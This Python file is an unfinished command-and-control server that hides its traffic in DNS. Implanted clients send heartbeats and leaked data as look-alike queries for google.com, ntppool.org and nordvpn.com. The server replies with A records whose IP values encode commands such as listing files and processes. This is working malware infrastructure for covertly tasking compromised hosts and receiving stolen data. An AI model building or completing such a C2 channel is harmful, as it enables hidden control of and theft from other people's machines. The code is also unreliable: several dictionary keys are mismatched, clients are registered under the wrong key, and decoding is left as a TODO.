import datetime
import select
from argparse import ArgumentParser
from typing import Any, Dict

from dnslib import *


class Command:
    def __init__(self, addr):
        self.addr = addr
        self.completed = True
        self.started = False
        self.segments = []
        self.command = None

    def start(self):
        self.completed = False
        self.started = True
        self.segments.clear()

    def add_segment(self, data):
        self.segments.append(data)


class Server:

    def __init__(self, args):
        self.password = args.password
        self.silent = args.silent
        self.listening_port = args.port
        self.listening_ip = args.ip

        self.serv_to_client = {
            "LS": "1.2.3.2",
            "W": "1.2.3.3",
            "PS": "1.2.3.5",
            "PWD": "1.2.3.6",
            "ACK": "1.2.3.4",
            "RST": "1.2.4.3",
            "NOP": "1.2.3.1"
        }
        self.client_to_serv = {
            "HB": "google.com",
            "RESP": "ntppool.org",
            "DONE": "nordvpn.com"
        }

        self.connected_clients = {}
        self.commands_for_clients: Dict[Any, Command] = {}
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind((self.listening_ip, self.listening_port))
        self.socket.setblocking(False)

        self.__log("Started listening on port: {}, ip: {}".format(self.listening_port, self.listening_ip))
        self.running = False

    def __log(self, message):
        if self.silent:
            return
        print("CC: {}".format(message))

    def run(self):
        if self.running:
            self.__log("Already running...")
            return
        self.running = True

        while self.running:
            ready = select.select([self.socket], [], [], 10)
            if not ready:
                continue

            data, addr = self.socket.recvfrom(1024)
            request = DNSRecord.parse(data)

            if request.get_q().get_qname().matchGlob(self.client_to_serv["HB"]):
                # It is a heartbeat..
                self.__log("{} Heartbeat".format(addr))

                repl = self.heartbeat_reply(request.reply(), addr)
            elif request.get_q().get_qname().matchGlob(self.client_to_serv["response"]):
                # It is a reply for our request:
                self.__log("{}: We got a response for our request!".format(addr))

                repl = self.extract_data_from_request(request, addr)
            elif request.get_q().get_qname().matchGlob(self.client_to_serv["done"]):
                # The client has finished sending us data...
                self.__log("{}: Finished request".format(addr))
                repl = self.finished_stream(request, addr)
            else:
                self.__log("{}: ERROR: Got unknown packet, that violates the protocol! Ignoring...".format(addr))
                return

            self.socket.sendto(bytes(repl.pack()), addr)

    def finished_stream(self, request, addr):
        if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
            self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
            command = self.serv_to_client["RST"]

        else:
            self.__log(
                "{}: Finished receiving stream for command: {}".format(addr, self.commands_for_clients[addr].command))
            command = self.serv_to_client["ACK"]

        repl = request.reply()
        repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))

        return repl

    def decode_segment(self, data):
        """
        Decodes and returns a segment
        """

        # TODO:
        return data


    def extract_data_from_request(self, request, addr):
        if addr not in self.connected_clients or not self.commands_for_clients[addr].started:
            self.__log("{}: ERROR: Got a protocol-violated message! Sending reset signal...".format(addr))
            command = self.serv_to_client["RST"]
        else:
            self.__log("{}: Got data segment for command: {}".format(addr, self.commands_for_clients[addr].command))

            qname = str(request.get_q().get_qname())
            qname = qname.rstrip(self.client_to_serv["RESP"])

            self.commands_for_clients[addr].add_segment(self.decode_segment(qname))

            command = self.serv_to_client["ACK"]

        repl = request.reply()
        repl.add_answer(RR(request.get_q().get_qname(), QTYPE.A, rdata=A(command), ttl=60))
        return repl

    def heartbeat_reply(self, request, addr):
        new_one = addr not in self.connected_clients
        self.connected_clients[addr] = datetime.datetime.now().timestamp()

        if new_one:
            # We register a new client
            self.commands_for_clients[new_one] = Command(addr)
            command = self.serv_to_client["ACK"]

        elif self.commands_for_clients[addr].completed:
            # We do not have any commands for this machine
            command = self.serv_to_client["NOP"]

        else:
            # We have job for you!
            if self.commands_for_clients[addr].started:
                self.__log(
                    "{}: ERROR: The client has sent us a Heartbeat, while it was supposed to send a reply!".format(
                        addr))

            self.commands_for_clients[addr].start()
            command = self.commands_for_clients[addr].command

        # Sanity check
        if command is None:
            self.__log("{}: Cannot launch None command!".format(addr))
            return

        reply = request.reply()
        reply.add_answer(RR(self.client_to_serv["HB"], QTYPE.A, rdata=A(command), ttl=60))
        self.__log("{}: Sending {} command...".format(addr, command))
        return reply

    def cleanup_connected(self):
        """
        Removes all inactive clients from the client list
        """
        for i in self.connected_clients:
            if abs((datetime.datetime.now() - self.connected_clients[i]).total_seconds()) > 200:
                del self.connected_clients[i]
                del self.commands_for_clients[i]

    def next_command(self):
        """
        Instruction for the Server object to get and answer a new command from the user. 
        """
        # TODO:

        command = input("y for stopping the server")
        if command.lower() == "y":
            self.running = False


if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-pass", "--password", help="The password used to encrypt the communication", type=str,
                        default="heslo")
    parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
    parser.add_argument("-ip", "--ip", help="Server IP", type=str, default="127.0.0.1")
    parser.add_argument("-p", "--port", help="Port for the server to run on", type=int,
                        default=51276)  # TODO: Arbitrary...
    args = parser.parse_args()

    server = Server(args)
    server.run()

    while server.running:
        server.next_command()
